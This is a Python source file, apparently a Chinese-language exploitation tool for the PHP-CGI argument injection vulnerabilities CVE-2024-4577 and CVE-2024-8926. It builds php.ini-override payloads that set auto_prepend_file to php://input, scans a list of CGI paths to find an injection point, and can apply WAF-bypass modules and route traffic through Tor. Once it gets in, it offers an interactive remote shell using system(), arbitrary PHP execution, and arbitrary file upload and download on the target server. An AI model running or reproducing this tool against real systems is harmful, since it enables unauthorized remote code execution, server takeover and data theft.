import argparse
import requests
import sys
import urllib3
import chardet
import os
import base64
import re
import time
from urllib.parse import urlparse
import textwrap

from rich import print as rprint
from rich.panel import Panel
from rich.console import Console
from rich.text import Text
from rich.markdown import Markdown
from rich.syntax import Syntax
from rich.table import Table
import banner
import tor_helper

console = Console()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Payload 參數庫
PAYLOAD_ELEMENTS = {
    1: "disable_functions%3d%26",
    2: "disable_classes%3d%26",
    3: "open_basedir%3d",
    4: "cgi.force_redirect%3d0",
    5: "cgi.redirect_status_env",
    6: "allow_url_include%3d1",
    7: "allow_url_fopen%3d1",
    8: "auto_prepend_file%3dphp://input",
    9: "file_uploads%3d1",
    10: "upload_max_filesize%3d0",
    11: "log_errors%3d0",
    12: "post_max_size%3d0",
    13: "memory_limit%3d%2B1",
    14: "enable_dl%3d1",
    15: "max_execution_time%3d0",
    16: "short_open_tag%3d1",
    17: "max_input_time%3d0",
    18: "expose_php%3d1"
}

# 預設 Payload 組合庫
PAYLOAD_COMBINATIONS = {
    "1": [1, 2, 3, 4, 5, 6, 7, 8],
    "2": [1, 4, 5, 6, 8],
    "3": [4, 6, 8],
}

# 連接符
CVE_PREFIXES = {
    "CVE-2024-4577": "%ADd",
    "CVE-2024-8926": "%a8-d%a8"
}

# 常見 CGI 路徑字典
CGI_POINTS = [
    "/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe",
    "/php-cgi.exe", "/cgi/php-cgi.exe", "/php.exe",
    "/cgi-bin/php.exe", "/cgi/php.exe",
    "/index.php", "/"
]

# 全域變數初始設定
enable_log = False
VERBOSE_MODE = False
use_tor = False
tor_session = None
timeout_value = 10
active_request_template = None
selected_payload_group = "1"
PAYLOAD_GROUPS = {}

# Parse arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="CVE-2024-4577 & CVE-2024-8926 Exploitation Tool")
    parser.add_argument("-u", "--url", required=True, help="目標網址")
    parser.add_argument("--timeout", type=int, default=10, help="預設為10，若須逾時秒數，0 為無限等待，建議 1~30，最大 120")
    parser.add_argument("--log", action="store_true", help="啟用shell log 模式")
    parser.add_argument("--verbose", action="store_true", help="顯示詳細請求資訊，更好的進行判斷")
    parser.add_argument("--payload", nargs="?", const="SELECT", help="選擇 Payload 編號，預設為1，若未指定值則進入選單選擇，輸入 C 則進入自訂模式")
    parser.add_argument("--tor", action="store_true", help="啟用 Tor 模式")
    parser.add_argument("--bypass", action="store_true", help="啟用 WAF 繞過測試")
    return parser.parse_args()

# 組合 Payload
def generate_payload_groups():
    global PAYLOAD_GROUPS
    PAYLOAD_GROUPS = {
        group_id: {
            cve: "+".join([f"{prefix}+{PAYLOAD_ELEMENTS[e]}" for e in elements])
            for cve, prefix in CVE_PREFIXES.items()
        }
        for group_id, elements in PAYLOAD_COMBINATIONS.items()
    }
    return PAYLOAD_GROUPS

PAYLOAD_GROUPS = generate_payload_groups()
selected_payload_group = "1"
PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]

# Payload選擇
def get_selected_payload_group(args):
    global selected_payload_group, PAYLOADS
    if "--payload" not in args:
        selected_payload_group = "1"
        PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]
        return selected_payload_group, PAYLOADS

    payload_index = args.index("--payload") + 1
    if payload_index >= len(args):
        rprint("[bold red][!] 沒有指定 Payload，請手動選擇！[/bold red]")
        return show_payload_list()

    user_choice = args[payload_index]
    if user_choice in PAYLOAD_GROUPS:
        selected_payload_group = user_choice
        PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]
        return selected_payload_group, PAYLOADS

    rprint("[bold yellow][!] 無效的 Payload，請手動選擇！[/bold yellow]")
    return show_payload_list()

# 顯示可用 `Payload`，讓使用者手動選擇
def show_payload_list():
    global selected_payload_group
    rprint("[bold cyan][*] 可用的 Payload 組合：[/bold cyan]")
    time.sleep(0.1)
    
    rprint("[dim]─" * 50)    
    for idx in sorted(PAYLOAD_COMBINATIONS.keys(), key=int):
        rprint(f"[bold cyan]{idx}) 所包含 Payload 元素如下：[/bold cyan]")

        printed = set()
        for element_key in PAYLOAD_COMBINATIONS[idx]:
            if element_key not in PAYLOAD_ELEMENTS:
                continue
            content = PAYLOAD_ELEMENTS[element_key].strip()
            if not content or content in printed:
                continue
            printed.add(content)

            text = Text("• ", style="green")
            text.append(content, style="white")
            if "php://input" in content:
                start = content.find("php://input")
                end = start + len("php://input")
                text.stylize("bold red", 2 + start, 2 + end)
            console.print(text)
            time.sleep(0.04)

        rprint("[dim]─" * 50)
        time.sleep(0.02)

    while True:
        rprint("[bold cyan][?][/bold cyan] 請輸入對應的編號來切換 Payload 組或使用 C 自訂 Payload : ", end="")
        user_choice = input().strip()
        if user_choice in PAYLOAD_COMBINATIONS:
            selected_payload_group = user_choice
            print()
            break
        elif user_choice.upper() == "C":
            rprint("\n[bold blue][*] 進入自訂 Payload 模式...[/bold blue]")
            selected_payload_group = customize_payload()
            break
        else:
            rprint("[bold yellow][!] 無效輸入，請輸入正確的數字或 `C` 來自訂 Payload！[/bold yellow]\n")

    return selected_payload_group, PAYLOAD_COMBINATIONS[selected_payload_group]

# 自訂 Payload
def customize_payload():
    global PAYLOAD_COMBINATIONS, PAYLOAD_GROUPS, PAYLOADS, selected_payload_group

    rprint("\n[bold cyan][*] 目前可用的 Payload 元素：[/bold cyan]")
    rprint("[dim]─" * 50)
    time.sleep(0.1)
    max_key_len = max(len(str(k)) for k in PAYLOAD_ELEMENTS)
    for key in sorted(PAYLOAD_ELEMENTS.keys(), key=int):
        content = PAYLOAD_ELEMENTS[key]
        key_str = f"{key:0{max_key_len}d}"
        text = Text(f"[{key_str}] ", style="bold green")
        text.append(content, style="white")
        if "php://input" in content:
            start = content.find("php://input")
            end = start + len("php://input")
            text.stylize("bold red", len(f"[{key_str}] ") + start, len(f"[{key_str}] ") + end)
        console.print(text)
        time.sleep(0.02)
        print()
        time.sleep(0.02)

    rprint("[dim]─" * 50)

    while True:
        rprint("[bold cyan][?][/bold cyan] 請輸入要組合的元素編號（用空格分隔，例如：1 3 5 7）：", end="")
        user_input = input().strip()
        selected_elements = user_input.split()

        if all(e.isdigit() and int(e) in PAYLOAD_ELEMENTS for e in selected_elements):
            selected_elements = [int(e) for e in selected_elements]
            break
        else:
            rprint("[bold red][!] 無效輸入，請輸入可用的編號，用空格分隔！[/bold red]\n")

    new_id = str(len(PAYLOAD_COMBINATIONS) + 1)
    PAYLOAD_COMBINATIONS[new_id] = selected_elements
    PAYLOAD_GROUPS[new_id] = {
        cve: "+".join([f"{prefix}+{PAYLOAD_ELEMENTS[e]}" for e in selected_elements])
        for cve, prefix in CVE_PREFIXES.items()
    }

    rprint("\n[bold green][+] 已成功新增自訂 Payload！[/bold green]")
    time.sleep(0.05)
    
    text_4577 = Text("[*] CVE-2024-4577 Payload:\n    ", style="cyan")
    payload_4577 = PAYLOAD_GROUPS[new_id]['CVE-2024-4577']
    text_4577.append(payload_4577, style="white")
    if "php://input" in payload_4577:
        start = payload_4577.find("php://input")
        end = start + len("php://input")
        text_4577.stylize("bold red", 4 + start, 4 + end)  # 4 is indent offset
    console.print(text_4577)
    time.sleep(0.05)
    
    text_8926 = Text("[*] CVE-2024-8926 Payload:\n    ", style="cyan")
    payload_8926 = PAYLOAD_GROUPS[new_id]['CVE-2024-8926']
    text_8926.append(payload_8926, style="white")
    if "php://input" in payload_8926:
        start = payload_8926.find("php://input")
        end = start + len("php://input")
        text_8926.stylize("bold red", 4 + start, 4 + end)  # 4 is indent offset
    console.print(text_8926)
    time.sleep(0.05)
    
    print()
    selected_payload_group = new_id
    PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]
    
    return new_id
    
def interactive_bypass_setup():
    try:
        from bypass_manager import load_all_tampers
    except ImportError:
        rprint("[bold red][!] 錯誤：未找到 `bypass_manager` 模組，請確認此模組是否存在。[/bold red]")
        return [], 0

    all_tampers = load_all_tampers()
    rprint("\n[bold cyan][*][/bold cyan] 可用繞過方案：")
    rprint("[dim]─" * 50)
    for idx, (name, desc) in enumerate(all_tampers.items(), 1):
        rprint(f"[bold cyan]{idx})[/bold cyan] [bold white]{name}[/bold white] ：")
        rprint(f"[grey70]{desc}[/grey70]\n")
        time.sleep(0.07)
    rprint("[dim]─" * 50)
    
    rprint("[bold cyan][?][/bold cyan] 請輸入要啟用的方案編號（可多選，例如：1 3 4）: ", end="")
    chosen = input().strip().split()
    selected = []
    for c in chosen:
        if c.isdigit() and 1 <= int(c) <= len(all_tampers):
            selected.append(list(all_tampers.keys())[int(c) - 1])

    if len(selected) > 1:
        rprint("[bold yellow][!][/bold yellow] [yellow]提醒：多個繞過方案可能導致相互衝突或失敗！[/yellow]")

    rprint("[bold cyan][?][/bold cyan] 請輸入重試次數（建議 1-10）: ", end="")
    retries = input().strip()
    retries = int(retries) if retries.isdigit() and int(retries) > 0 else 1
    print()
    return selected, retries

def run_bypass_mode(url, selected_module_names, retry_count):
    from bypass_manager import load_tamper_functions

    tamper_funcs = load_tamper_functions(selected_module_names)
    original_elements = PAYLOAD_COMBINATIONS.get(selected_payload_group, [])

    for cve_id, original_payload in PAYLOADS.items():
        for _ in range(retry_count):
            for cgipoint in CGI_POINTS:
                req = {
                    "url": url,
                    "cgipoint": cgipoint,
                    "payload": original_payload,
                    "headers": {},
                    "post_data": "<?php echo 'TEST_BYPASS'; ?>",
                    "element_ids": original_elements,
                    "cve_id": cve_id
                }

                for tamper in tamper_funcs:
                    req = tamper(req)

                full_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
                response = send_request(full_url, req["post_data"], timeout=timeout_value, headers=req["headers"])

                if response and "TEST_BYPASS" in response:
                    rprint(f"[bold green][+] 成功繞過！使用:[/bold green] [cyan]{', '.join(selected_module_names)}[/cyan]")
                    rprint(f"[bold green][+] 找到CGI注入點:[/bold green] [cyan]{req['cgipoint']}[/cyan] (漏洞: [magenta]{cve_id}[/magenta])\n")
                    global active_request_template
                    active_request_template = req
                    return req["cgipoint"], cve_id
    if VERBOSE_MODE:
        rprint("[bold red]========================================================================================[/bold red]")
        rprint("[red][-] 所有策略組合嘗試失敗[/red]")
        rprint("[bold red]========================================================================================[/bold red]\n")
    else:
        rprint("[bold red][-] 所有策略組合嘗試失敗[/bold red]")
    return None, None

# 自動轉換編碼
def decode_response(response):
    detected = chardet.detect(response.content)
    encoding = detected.get('encoding')
    return response.content.decode(encoding, errors='replace') if encoding else response.content.decode('utf-8', errors='replace')

# 發送請求
def send_request(url, data, timeout=None, headers=None, use_template=False):
    if headers is None:
        headers = {}
    try:
        global active_request_template
        if use_template and active_request_template:
            url = f"{url}{active_request_template['cgipoint']}?{active_request_template['payload']}"
            headers = active_request_template.get("headers", {})

        if VERBOSE_MODE:
            rprint("\n[bold cyan]======================================= 發送請求 =======================================[/bold cyan]")
            table = Table(show_header=False, box=None, padding=(0,1))
            wrapped_url = textwrap.fill(url, width=65)
            table.add_row("[cyan]URL[/cyan]", Text(wrapped_url, style="white"))
            table.add_row("[cyan]Data[/cyan]", str(data))
            table.add_row("[cyan]Timeout[/cyan]", str(timeout))
            if headers:
                wrapped_headers = textwrap.fill(str(headers), width=65)
                table.add_row("[cyan]Headers[/cyan]", Text(wrapped_headers, style="white"))
            console.print(table)
            rprint("[bold cyan]========================================================================================[/bold cyan]\n")

        if isinstance(data, str):
            data = data.encode("utf-8")

        if use_tor:
            response = tor_session.post(url, data=data, headers=headers, timeout=timeout)
        else:
            response = requests.post(url, data=data, headers=headers, verify=False, timeout=timeout)

        if VERBOSE_MODE:
            rprint("[bold cyan]======================================= 回應資訊 =======================================[/bold cyan]")
            table = Table(show_header=False, box=None, padding=(0,1))
            status_code = response.status_code
            if 200 <= status_code < 300:
                status_color = "green"
            elif 300 <= status_code < 400:
                status_color = "bright_cyan"
            elif status_code == 401:
                status_color = "khaki1"
            elif 400 <= status_code < 500:
                status_color = "blue"
            elif 500 <= status_code < 600:
                status_color = "red"
            else:
                status_color = "magenta"
            table.add_row(f"[cyan]Status[/cyan]", f"[{status_color}]{status_code}[/{status_color}]")
            table.add_row("[cyan]Preview[/cyan]", response.text[:500])
            console.print(table)
            rprint("[bold cyan]========================================================================================[/bold cyan]\n")

        return decode_response(response)
    except Exception as e:
        rprint(f"[bold red][!] 請求錯誤: {e}[/bold red]")
        return None


# 枚舉注入點
def choose_cgipoint(url, payload_key):
    test_payload = "<?php echo 'TEST_VULNTEST_CVE-2024-4577'; die(); ?>"
    if VERBOSE_MODE:
        rprint(f"[bold violet]============================= 測試 Payload : {payload_key} =============================[/bold violet]")
        table = Table(show_header=False, box=None, padding=(0,1))
        wrapped_payload = textwrap.fill(PAYLOADS[payload_key], width=65)
        payload_text = Text(wrapped_payload, style="white")
        table.add_row("[violet]Key[/violet]", Text(str(payload_key), style="white"))
        table.add_row("[violet]Payload[/violet]", payload_text)
        console.print(table)
        rprint("[bold violet]========================================================================================[/bold violet]\n")
    
    for ep in CGI_POINTS:
        target_url = f"{url}{ep}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, test_payload, timeout=timeout_value)
        if resp and 'TEST_VULNTEST_CVE-2024-4577' in resp:
            rprint(f"[bold green][+] 找到CGI注入點:[bold green] [cyan]{ep}[/cyan] (漏洞: [magenta]{payload_key}[/magenta])\n")
            return ep
    if VERBOSE_MODE:
        rprint("[bold yellow]========================================================================================[/bold yellow]")
        rprint(f"[yellow][-] 未找到漏洞 {payload_key}[yellow]")
        rprint("[bold yellow]========================================================================================[/bold yellow]\n")
    else:    
        rprint(f"[yellow][-] 未找到漏洞 {payload_key}[yellow]")
    return None
    
# 移除不能用於檔名的字元
def sanitize_filename(filename):
    return re.sub(r'[\/:*?"<>|]', '_', filename)

# 以攻擊目標的 host 為基礎建立檔案名稱
def get_unique_filepath(directory, host):
    base_filename = sanitize_filename(host)
    candidate = os.path.join(directory, f"{base_filename}.txt")
    i = 1
    while os.path.exists(candidate):
        candidate = os.path.join(directory, f"{base_filename}_{i}.txt")
        i += 1
    return candidate

# 取得目標網站的根目錄
def get_remote_docroot(url, cgipoint, payload_key):
    payload = "<?php echo $_SERVER['DOCUMENT_ROOT']; die(); ?>"
    target_url = f"{url}{cgipoint}?{PAYLOADS[payload_key]}"
    resp = send_request(target_url, payload, timeout=timeout_value)
    return resp.strip() if resp else None

# 交互式shell
def exploit_shell(url, cgipoint, payload_key):
    rprint("[cyan][*] 輸入命令，輸入 exit 結束，可使用 --save 儲存單次輸出：[/cyan]")
    host = urlparse(url).netloc
    log_dir = os.path.join(os.getcwd(), "log")
    if enable_log:
        rprint("[cyan][*] log模式已啟動[/cyan]")
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
    print()
    log_path = os.path.join(log_dir, f"{host}.log") if enable_log else None

    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() == "exit":
            break

        parts = cmd.split("--save")
        real_cmd = parts[0].strip()
        save_path = parts[1].strip() if len(parts) > 1 else None

        if save_path == "":
            save_dir = os.path.join(os.getcwd(), "output")
            if not os.path.exists(save_dir):
                os.makedirs(save_dir)
            save_path = get_unique_filepath(save_dir, host)

        payload = f"<?php system('{real_cmd}'); die(); ?>"
        if active_request_template:
            resp = send_request(url, payload, timeout=timeout_value, use_template=True)
        else:
            target_url = f"{url}{cgipoint}?{PAYLOADS[payload_key]}"
            resp = send_request(target_url, payload, timeout=timeout_value)

        output = resp.strip() if resp else ""
        print(output)
        

        if save_path:
            save_path = os.path.abspath(save_path)
            with open(save_path, "w", encoding="utf-8") as f:
                f.write(output)
            rprint(f"[green][+] 輸出結果已儲存至 {save_path}[/green]")
        print()
        if enable_log:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"CMD: {real_cmd}\n{output}\n{'-'*20}\n")
               
# 自訂php
def custom_php_mode(url, cgipoint, payload_key):
    rprint("[cyan][*] 輸入PHP程式碼，輸入 EOF 結束，可使用 --save 儲存輸出：[/cyan]")
    
    php_code = ""
    save_path = None
    host = urlparse(url).netloc

    while True:
        line = input()
        if line.strip().startswith("EOF"):
            parts = line.split("--save")
            if len(parts) > 1:
                save_path = parts[1].strip()
                if save_path == "":
                    save_dir = os.path.join(os.getcwd(), "output")
                    if not os.path.exists(save_dir):
                        os.makedirs(save_dir)
                    save_path = get_unique_filepath(save_dir, host)
            break
        php_code += line + "\n"

    payload = f"<?php {php_code}\ndie(); ?>"
    if active_request_template:
        resp = send_request(url, payload, timeout=timeout_value, use_template=True)
    else:
        target_url = f"{url}{cgipoint}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, payload, timeout=timeout_value)
    output = resp.strip() if resp else ""
    rprint("[dim]─" * 150)
    print(output)
    
    if save_path:
        save_path = os.path.abspath(save_path)
        with open(save_path, "w", encoding="utf-8") as f:
            f.write(output)
        rprint(f"[green][+] PHP輸出結果已儲存至 {save_path}[/green]")
    rprint("[dim]─" * 150)

# 上傳檔案
def upload_file(url, cgipoint, payload_key):
    local = input("本地檔案路徑：").strip()
    remote = input("目標完整路徑（若留空將上傳至網站根目錄）：").strip()
    print()
    if remote == "":
        docroot = get_remote_docroot(url, cgipoint, payload_key)
        if docroot:
            remote = os.path.join(docroot, os.path.basename(local)).replace("\\", "/")
            rprint(f"[green][*] 已自動設定上傳路徑為: {remote}[/green]")
        else:
            rprint("[red][!] 無法取得網站根目錄，請手動指定完整路徑[/red]")
            return

    try:
        with open(local, "r", encoding="utf-8", errors="ignore") as f:
            raw_content = f.read()
    except Exception as e:
        rprint(f"[red][!] 讀取本地檔案失敗: {e}[/red]")
        return

    payload = f"<?php file_put_contents('{remote}', '{raw_content}'); echo 'OK'; die(); ?>"
    if active_request_template:
        resp = send_request(url, payload, timeout=timeout_value, use_template=True)
    else:
        resp = send_request(f"{url}{cgipoint}?{PAYLOADS[payload_key]}", payload)

    if resp and "OK" in resp:
        rprint(f"[green][+] 成功上傳至 {remote}[/green]")
    else:
        rprint("[red][!] 上傳失敗，無回應[/red]")
    print()

# 下載檔案
def download_file(url, cgipoint, payload_key):
    remote = input("[?] 遠端檔案路徑：").strip()
    if not remote:
        rprint("[bold red][!] 未輸入檔案路徑，取消下載。[/bold red]\n")
        return

    
    local = os.path.join("download", os.path.basename(remote))
    if not os.path.exists("download"):
        os.makedirs("download")

    payload = f"<?php echo file_get_contents('{remote}'); die(); ?>"
    if active_request_template:
        resp = send_request(url, payload, timeout=timeout_value, use_template=True)
    else:
        resp = send_request(f"{url}{cgipoint}?{PAYLOADS[payload_key]}", payload)

    if not resp or resp.strip() == "":
        rprint(f"[bold red][!] 檔案不存在或伺服器無回應：{remote}[/bold red]\n")
        return

    with open(local, "wb") as f:
        f.write(resp.encode("utf-8"))
    rprint(f"[bold green][+] 已下載至 {local}[/bold green]\n")


# 失敗後動作清單
def show_fail_menu(target, selected_payload_group, bypass_modules_selected, bypass_retry_count, first_round=False):
    print()
    header_text = "[-] 未找到可用漏洞，切換設定後可選擇 4 重新測試：" if first_round \
        else "[!] 請確認設定後選擇 4 開始測試："
    panel_style = "bold red" if first_round else "bold yellow"
    console.print(Panel(header_text, title="", style=panel_style, expand=False))

    import time
    time.sleep(0.05)
    rprint(f"[cyan]1)[/cyan] :satellite: 變更目標網址 [[bold blue]{target}[/bold blue]]")
    payload_display = "自訂" if selected_payload_group not in PAYLOAD_COMBINATIONS else selected_payload_group
    time.sleep(0.05)
    rprint(f"[cyan]2)[/cyan] :gear:  選擇 Payload 組合 [[bold cyan]{payload_display}[/bold cyan]]")
    bypass_info = f"{', '.join(bypass_modules_selected)}；次數：{bypass_retry_count}" if bypass_modules_selected else "未選擇"
    time.sleep(0.05)
    rprint(f"[cyan]3)[/cyan] :zap: 設定繞過方案 [[bold cyan]{bypass_info}[/bold cyan]]")
    time.sleep(0.05)
    rprint("[cyan]4)[/cyan] 🔁 [bold]開始重新測試[/bold]（使用上列設定）")
    time.sleep(0.05)
    rprint("[cyan]5)[/cyan] ❌ [bold]離開程式[/bold]")
    return input("\n>> ").strip()
    
# main 函數
def main():
    global timeout_value, PAYLOADS, selected_payload_group, VERBOSE_MODE, enable_log, use_tor, tor_session

    args = parse_arguments()
    target = args.url
            
    enable_log = args.log
    VERBOSE_MODE = args.verbose
    use_tor = args.tor
    enable_bypass = args.bypass
    
    banner.play_banner(use_tor, enable_bypass)
    banner.Show_Disclaimer()
    
    if args.timeout == 0:
        rprint("[bold green][*] 已設置為無限等待[/bold green]")
    elif args.timeout > 120:
        rprint("[bold red][!] 等待時間過久 (超過 120 秒)，如需要無限等待請使用 --timeout=0[/bold red]")
        sys.exit(1)
    elif args.timeout > 30:
        timeout_value = args.timeout
        rprint("[bold yellow][!] 警告：timeout 超過 30 秒，測試可能會耗時較久[/bold yellow]")
    elif args.timeout < 1:
        rprint("[bold red][!] 錯誤：timeout 必須為 0 或 1~120 之間的整數[/bold red]")
        sys.exit(1)
    else:
        timeout_value = args.timeout
        if args.timeout != 10:
            rprint(f"[bold green][*] 設定請求超時時間為 {timeout_value} 秒[/bold green]")


    if use_tor:
        tor_session = tor_helper.get_tor_session()
        if not tor_session:
            sys.exit(1)

    # Payload選擇邏輯區塊
    generate_payload_groups()

    if args.payload == "C":
        rprint("\n[bold cyan][*] 進入自訂 Payload 模式...[/bold cyan]")
        selected_payload_group = customize_payload()
    elif args.payload and args.payload in PAYLOAD_GROUPS:
        selected_payload_group = args.payload
    elif args.payload:
        rprint("\n[bold yellow][!] 無效或遺漏的 Payload 組合，進入選擇介面[/bold yellow]")
        selected_payload_group, PAYLOADS = show_payload_list()
    else:
        selected_payload_group = "1" #預設

    # 確保 PAYLOADS 一定對應正確
    PAYLOADS = PAYLOAD_GROUPS.get(selected_payload_group, PAYLOAD_GROUPS["1"])

    bypass_modules_selected = []
    bypass_retry_count = 1
    if enable_bypass:
        bypass_modules_selected, bypass_retry_count = interactive_bypass_setup()

    while True:
        selected_cgipoint, selected_payload = None, None
        next_action = None 
        already_scanned_this_round = False
        rprint("[bold green][*] 開始測試...[/bold green]")

        if enable_bypass and bypass_modules_selected:
            rprint("[bold cyan][*][/bold cyan] 已啟用 Bypass 模式，套用以下繞過策略：")
            for name in bypass_modules_selected:
                rprint(f"[cyan]    - {name}[/cyan]")            
            rprint(f"\n[bold cyan][*][/bold cyan] 將重試每組繞過組合 [bold]{bypass_retry_count}[/bold] 次\n")

            selected_cgipoint, selected_payload = run_bypass_mode(target, bypass_modules_selected, bypass_retry_count)
            already_scanned_this_round = True

        if not already_scanned_this_round:
            for p in PAYLOADS:
                ep = choose_cgipoint(target, p)
                if ep:
                    selected_cgipoint, selected_payload = ep, p
                    break
                    
        fail_menu_first_time = True

        while not selected_cgipoint:
            next_action = show_fail_menu(target, selected_payload_group, bypass_modules_selected, bypass_retry_count, first_round=fail_menu_first_time)
            fail_menu_first_time = False

            if next_action == "1":
                print("\n" + "-"*50)
                target = input("[?] 輸入新目標 URL: ").strip()
                rprint("[bold green][*] 目標已更新，返回選單中...[/bold green]")
                time.sleep(0.2)
            elif next_action == "2":
                print("\n" + "-"*50)
                selected_payload_group, _ = show_payload_list()
                PAYLOADS = PAYLOAD_GROUPS.get(selected_payload_group, PAYLOAD_GROUPS["1"])
                rprint("[bold green][*] Payload 已更新，返回選單中...[/bold green]")
                time.sleep(0.2)
            elif next_action == "3":
                print("\n" + "-"*50)
                enable_bypass = True
                bypass_modules_selected, bypass_retry_count = interactive_bypass_setup()
                rprint("[bold green][*] 繞過設定已更新，返回選單中...[/bold green]")
                time.sleep(0.2)
            elif next_action == "4":
                break
            else:
                rprint("[bold yellow][*] 程式結束[/bold yellow]")
                sys.exit(0)

        if next_action != "4" and not selected_cgipoint:
            continue

        while selected_cgipoint:
            time.sleep(0.05)
            header = Text(" Exploit 模式選單 ", style="bold cyan")
            body = Text()
            body.append("當前目標：", style="cyan")
            body.append(f"{target}\n", style=" sky_blue1")
            body.append("當前注入點：", style="cyan")
            body.append(f"{selected_cgipoint}\n", style=" sky_blue1")
            body.append("漏洞編號：", style="cyan")
            body.append(f"{selected_payload}", style="sky_blue1"),
            (target, "bold blue"),
            ("漏洞：", "white"),
            (selected_payload, "magenta")
            
            console.print(Panel(body, title=header, border_style="bright_blue", expand=False))

            time.sleep(0.07)
            rprint("[cyan]1)[/cyan] 🧪 [bold white]Shell模式[/bold white]")
            time.sleep(0.07)
            rprint("[cyan]2)[/cyan] 🛠️ [bold white]PHP自訂端模式[/bold white]")
            time.sleep(0.07)
            rprint("[cyan]3)[/cyan] 📤 [bold white]上傳檔案[/bold white]")
            time.sleep(0.07)
            rprint("[cyan]4)[/cyan] 📥 [bold white]下載檔案[/bold white]")
            time.sleep(0.07)
            rprint("[cyan]5)[/cyan] 🎯 [bold white]切換攻擊目標[/bold white]")
            time.sleep(0.07)
            rprint("[cyan]6)[/cyan] ❌ [bold white]離開程式[/bold white]")

            choice = input(">> ").strip()
            print()
            if choice == "1":
                exploit_shell(target, selected_cgipoint, selected_payload)
            elif choice == "2":
                custom_php_mode(target, selected_cgipoint, selected_payload)
            elif choice == "3":
                upload_file(target, selected_cgipoint, selected_payload)
            elif choice == "4":
                download_file(target, selected_cgipoint, selected_payload)
            elif choice == "5":
                target = input("輸入新目標URL:").strip()
                print()
                break
            elif choice == "6":
                rprint("[bold yellow][*] 程式結束[/bold yellow]")
                sys.exit(0)
            else:
                rprint("[bold red][!] 無效的選擇，請重新選擇[/bold red]\n")

if __name__ == "__main__":
    main()




